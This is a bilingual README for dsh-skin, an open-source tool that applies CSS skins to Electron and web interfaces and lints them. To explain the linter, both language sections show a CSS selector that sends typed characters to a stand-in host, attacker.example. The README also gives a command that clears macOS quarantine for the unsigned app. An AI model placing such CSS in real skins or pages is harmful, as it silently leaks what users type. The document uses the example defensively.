<div align="center">

<img src="docs/images/icon.png" width="104" alt="">

# dsh-skin

**Skins for Electron apps and web UIs — with a linter that refuses to install the dangerous ones.**

给 Electron 应用和 Web 界面换皮肤 —— 附带一个会拒绝安装危险皮肤的检查器

[Download](https://github.com/LinzOpen/dsh-skin/releases/latest) ·
[Skin format](docs/skin-format.md) ·
[Make your app skinnable](docs/hosts.md) ·
[Why CSS needs a linter](docs/security.md)

</div>

---

## What it is

A skin is a folder: `skin.json` + `skin.css` + whatever images it needs. `dsh-skin` is three things
that make those folders useful.

**A desktop app.** Download it, open it, and it works with nothing else installed — the live preview
runs against a built-in mock UI, so you can see and author skins on a clean machine.

**A shell.** Type a URL — usually a web UI you run locally — and it opens in a window wearing the
current skin. Switch skins and every shell window changes at once.

**A linter.** A skin is code that gets injected into your interface, and *plain CSS can exfiltrate
what you type*:

```css
input[value^="a"] { background: url(https://attacker.example/?a); }
```

One rule per character, one request per hit. `dsh-skin` refuses to inject any skin that reaches the
network — that's a block, not a warning. It also catches the two failure modes that make skins rot:
full-window `infinite` animations (measured: **2.5% → 111% CPU** on one host) and selectors hooked
to compiled class names like `.pI_x6G_frame`, which change on the host's next build.

<img src="docs/images/studio-dark.png" alt="Studio, dark preview">

## Install

**Prebuilt** — grab the [latest release](https://github.com/LinzOpen/dsh-skin/releases/latest):

| | file |
|---|---|
| macOS (Apple silicon) | `dsh-skin-*-arm64.dmg` |
| macOS (Intel) | `dsh-skin-*-x64.dmg` |
| Windows | `dsh-skin-Setup-*.exe`, or the `.zip` for a portable copy |
| Linux | `dsh-skin-*.AppImage` |

**The builds are not code-signed** — there is no paid certificate behind this project. First launch:

- **macOS** — right-click the app → *Open* → *Open*. (Double-clicking shows "damaged" or "unidentified
  developer"; right-click → Open is the supported override.) If Gatekeeper still refuses:
  `xattr -dr com.apple.quarantine "/Applications/dsh-skin.app"`
- **Windows** — SmartScreen shows *Windows protected your PC* → *More info* → *Run anyway*.

**From source:**

```bash
git clone https://github.com/LinzOpen/dsh-skin.git
cd dsh-skin && npm install && npm start
```

## Write a skin

```bash
npx @dsh-skin/cli new midnight-rain     # scaffold
npx @dsh-skin/cli validate skins        # lint — exit code 1 on any error
npx @dsh-skin/cli pack skins/midnight-rain   # zip it for sharing
```

Or click **新建皮肤 / New skin** in the app and edit with live preview. The whole format is one page:
[docs/skin-format.md](docs/skin-format.md).

Have a background image instead of a palette? **导入素材 / Import images** turns a folder of pictures
into a skin — many pictures become one skin that rotates through them without repeats.

## Make your own app skinnable

```js
const { registerSkinScheme, createSkinHost } = require("@dsh-skin/host");

registerSkinScheme();                                  // before app.whenReady()

const skins = createSkinHost({ roots: [skinsDir] });   // after
skins.install();
skins.attach(mainWindow);
await skins.apply("midnight-harbor");
```

That is the whole integration. Details and the DSH plugin adapter: [docs/hosts.md](docs/hosts.md).

## Layout

```
packages/core      the engine — manifest, linter, library scan. No Electron, no deps.
packages/host      Electron adapter: custom protocol + serialised insertCSS.
packages/cli       dsh-skin validate / new / pack — the CI gate.
app                the desktop app: studio + shell.
skins              six original skins, pure CSS, CC0.
adapters/dsh-plugin  serves a skin library to a DSH renderer over local http.
```

## Contributing

Skins and code are both welcome. One hard rule: **every skin must declare a `license`, and you must
have the right to publish its assets.** Fan art and official game art are not CC0 no matter where you
found them — CI rejects a skin with no license field, and a PR shipping artwork you don't own gets
closed. See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

[MIT](LICENSE) for the code. Each skin carries its own license in its `skin.json`; the six that ship
here are CC0-1.0.

---

<details>
<summary><b>中文</b></summary>

## 这是什么

一套皮肤就是一个目录：`skin.json` + `skin.css` + 它要用的图。`dsh-skin` 是让这种目录变得有用的三样东西。

**一个桌面程序。** 下载打开就能用，不需要装任何别的软件 —— 实时预览跑在内置的假界面上，
所以在一台干净的机器上也能看皮肤、写皮肤。

**一个外壳。** 填一个网址（多半是你本地跑着的 Web UI），它会开一个套着当前皮肤的窗口。
换皮肤时所有外壳窗口一起换。

**一个检查器。** 皮肤是会被注入进你界面的代码，而**纯 CSS 也能把你输入的东西发出去**：

```css
input[value^="a"] { background: url(https://attacker.example/?a); }
```

一个字符一条规则，命中一次发一个请求。`dsh-skin` **拒绝注入**任何会访问网络的皮肤 ——
是拦截，不是警告。它还会抓另外两种让皮肤烂掉的写法：铺满窗口的 `infinite` 动画
（实测把一个宿主从 **2.5% CPU 拉到 111%**），以及钩住 `.pI_x6G_frame` 这类编译产物类名的选择器 ——
宿主下次构建就换一个哈希，皮肤当场失效。

## 安装

去 [Releases](https://github.com/LinzOpen/dsh-skin/releases/latest) 下对应的包：macOS 用 `.dmg`
（分 Apple 芯片和 Intel），Windows 用 `Setup.exe` 或便携版 `.zip`，Linux 用 `.AppImage`。

**没有代码签名** —— 这个项目背后没有付费证书。第一次打开：

- **macOS**：右键点应用 → *打开* → *打开*。（双击会说"已损坏"或"无法验证开发者"，
  右键打开是系统给的正规放行方式。）还是不行就跑
  `xattr -dr com.apple.quarantine "/Applications/dsh-skin.app"`
- **Windows**：SmartScreen 弹"已保护你的电脑" → *更多信息* → *仍要运行*

从源码跑：`git clone … && npm install && npm start`

## 写一套皮肤

命令行：`npx @dsh-skin/cli new <id>` 建骨架、`validate` 检查（有 error 退出码 1，可直接当 CI 闸门）、
`pack` 打成 zip。或者在程序里点「新建皮肤」，边改边看。格式说明一页写完：
[docs/skin-format.md](docs/skin-format.md)。

手上是图不是配色？点「导入素材」，一堆图会变成一套皮肤 —— 多张图就是一套可轮播的皮肤，
一轮之内不重复。

## 让你自己的 Electron 应用能换皮肤

三行（见上面英文段的代码块），细节和 DSH 插件适配器在 [docs/hosts.md](docs/hosts.md)。

## 贡献

皮肤和代码都欢迎。一条硬规矩：**每套皮肤必须写 `license`，并且你必须有权公开它的素材。**
同人图和游戏官方立绘不因为你在哪儿找到的就变成 CC0 —— CI 会拒绝没有 license 字段的皮肤，
夹带你没有权利的美术素材的 PR 会被关掉。见 [CONTRIBUTING.md](CONTRIBUTING.md)。

## 许可

代码 [MIT](LICENSE)。每套皮肤在自己的 `skin.json` 里声明许可；仓库自带的六套是 CC0-1.0。

</details>
